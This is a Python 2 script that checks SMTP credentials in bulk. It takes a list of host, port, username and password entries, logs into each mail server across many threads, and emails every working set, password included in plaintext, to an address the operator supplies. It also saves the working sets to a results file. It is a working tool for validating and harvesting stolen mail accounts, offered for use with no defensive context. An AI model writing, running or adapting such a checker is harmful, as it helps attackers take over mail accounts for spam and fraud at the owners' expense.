# -*- coding: utf-8 -*-
import smtplib, os, threading, sys
from Queue import Queue

try:
	os.mkdir("Results")
except:
	pass

# Global
smtp_worked = 0
smtp_die = 0

def cek(host,port,user,pwd, email_to):
	global smtp_worked
	global smtp_die
	try:
		info = ""
		pack = (host+"|"+str(port)+"|"+user+"|"+pwd)
		smtpserver = smtplib.SMTP(host,int(port),timeout=10)
		smtpserver.ehlo()
		try:
			smtpserver.starttls()
			ssl = '\033[32;1mTrue\033[0m'
		except:
			ssl = '\033[32;1mFalse\033[0m'
		smtpserver.ehlo()
		smtpserver.login(user,pwd)
		header = 'To:' + email_to + '\n' + 'From: ' + user + '\n' + 'Subject: SMTP Worked!\n'
		msg = header + '\n\n SMTP Test | Worked!\nhost: '+host+'\nport: '+port+'\nuser: '+user+'\npass: '+pwd+' \n\n'
		smtpserver.sendmail(user, email_to, msg)
		smtpserver.close()
		smtp_worked = smtp_worked + 1
		info += ' -> \033[32;1mSMTP Worked\033[0m -> SSL: '+str(ssl)
		saveresult = open("Results/smtp_worked.txt","a")
		saveresult.write(pack+"|"+str(ssl)+"\n")
		saveresult.close()
	except KeyboardInterrupt:
		print("Closed")
		sys.sys.exit()
	except Exception as error:
		info += ' -> \033[31;1mError\033[0m'
		smtp_die = smtp_die + 1
	print(pack+info)

def info():
	print("[ \033[33;1mResults save in :\033[0m Results/ ] [ \033[32;1mSMTP Work :\033[0m "+str(smtp_worked)+" ] [ \033[31;1mSMTP Dead :\033[0m "+str(smtp_die)+" ]")

try:
	list = open(sys.argv[1]).read()
	thre = sys.argv[2]
	email = sys.argv[3]
except:
	print("python2 smtp.py maillist.txt thread ourmail")
	exit()
jobs = Queue()
def do_stuff(q):
        while not q.empty():
                i = q.get()
                p = i.split('|')
                cek(p[0],p[1],p[2],p[3],email)
                q.task_done()

for trgt in list.splitlines():
	jobs.put(trgt)

for i in range(int(thre)): # Default 50 Thread Ganti Aja Kalau Mau
        worker = threading.Thread(target=do_stuff, args=(jobs,))
        worker.start()
jobs.join()
info()
